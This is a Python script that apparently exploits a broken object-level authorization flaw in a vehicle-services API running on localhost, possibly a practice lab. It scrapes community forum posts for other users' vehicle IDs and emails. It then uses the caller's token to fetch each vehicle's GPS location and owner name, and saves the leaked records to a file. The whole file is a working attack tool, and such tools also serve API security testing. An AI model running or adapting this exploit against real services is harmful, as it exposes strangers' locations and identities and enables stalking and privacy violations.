import requests
import json
import sys
import time
from datetime import datetime

BASE_URL = "http://localhost:8888"

HEADERS = {
    "User-Agent": "BOLA-Scanner/1.0",
    "Accept": "application/json",
    "Content-Type": "application/json"
}


class BOLAScanner:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url.rstrip('/')
        self.headers = HEADERS.copy()
        self.headers["Authorization"] = f"Bearer {auth_token}"
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def get_forum_posts(self, limit=30):
        endpoint = f"{self.base_url}/community/api/v2/community/posts/recent"
        posts = []
        offset = 0

        while True:
            params = {"limit": limit, "offset": offset}
            try:
                response = self.session.get(endpoint, params=params)
                response.raise_for_status()
                data = response.json()
            except requests.exceptions.RequestException as e:
                print(f"error fetching forum posts: {e}")
                break

            batch = data.get("posts", [])
            posts.extend(batch)

            next_offset = data.get("next_offset")
            if next_offset is None:
                break
            offset = next_offset

        return posts

    def extract_vehicle_uuids(self, posts):
        vehicles = {}
        for post in posts:
            author = post.get("author", {})
            uuid = author.get("vehicleid")
            if not uuid:
                continue
            vehicles[uuid] = {
                "uuid": uuid,
                "nickname": author.get("nickname", "unknown"),
                "email": author.get("email", "unknown"),
            }
        return list(vehicles.values())

    def check_vehicle_location(self, vehicle_uuid):
        endpoint = f"{self.base_url}/identity/api/v2/vehicle/{vehicle_uuid}/location"

        try:
            response = self.session.get(endpoint)
        except requests.exceptions.RequestException as e:
            print(f"error checking {vehicle_uuid}: {e}")
            return False, None

        if response.status_code != 200:
            return False, None

        try:
            data = response.json()
        except json.JSONDecodeError:
            return False, None

        # any 200 here is already a BOLA hit, since we never provided
        # a vehicleId that belongs to us - the presence of location
        # coords for someone else's carId is the actual proof
        if "vehicleLocation" in data and data.get("carId") == vehicle_uuid:
            return True, data

        return False, None

    def scan(self):
        print(f"target: {self.base_url}")
        print("fetching forum posts...")
        posts = self.get_forum_posts()

        if not posts:
            print("no posts found, exiting")
            return {"error": "no posts found"}

        print(f"found {len(posts)} posts")

        vehicles = self.extract_vehicle_uuids(posts)
        print(f"extracted {len(vehicles)} unique vehicle ids")

        if not vehicles:
            print("no vehicle ids found, exiting")
            return {"error": "no vehicle ids found"}

        results = {
            "timestamp": datetime.now().isoformat(),
            "total_tested": len(vehicles),
            "vulnerable": [],
            "secure": [],
        }

        for i, vehicle in enumerate(vehicles, 1):
            uuid = vehicle["uuid"]
            nickname = vehicle["nickname"]
            email = vehicle["email"]

            print(f"[{i}/{len(vehicles)}] testing {nickname} ({uuid[:8]}...)")

            is_vulnerable, data = self.check_vehicle_location(uuid)

            if is_vulnerable:
                loc = data.get("vehicleLocation", {})
                print(f"  vulnerable - got location for {email}")
                results["vulnerable"].append({
                    "uuid": uuid,
                    "nickname": nickname,
                    "email": email,
                    "latitude": loc.get("latitude"),
                    "longitude": loc.get("longitude"),
                    "full_name": data.get("fullName"),
                })
            else:
                print(f"  not accessible - {email}")
                results["secure"].append({
                    "uuid": uuid,
                    "nickname": nickname,
                    "email": email,
                })

            time.sleep(0.5)

        print()
        print(f"tested: {results['total_tested']}  "
              f"vulnerable: {len(results['vulnerable'])}  "
              f"secure: {len(results['secure'])}")

        return results


def load_token():
    try:
        with open("token.txt") as f:
            return f.read().strip()
    except FileNotFoundError:
        return None


def save_results(results, filename):
    with open(filename, "w") as f:
        json.dump(results, f, indent=2)
    print(f"results saved to {filename}")


def main():
    token = load_token()

    if not token:
        token = input("paste your JWT token: ").strip()
        if not token:
            print("no token provided, exiting")
            sys.exit(1)
        with open("token.txt", "w") as f:
            f.write(token)

    scanner = BOLAScanner(BASE_URL, token)
    results = scanner.scan()

    if results and "error" not in results and results["vulnerable"]:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        save_results(results, f"bola_scan_results_{timestamp}.json")


if __name__ == "__main__":
    main()
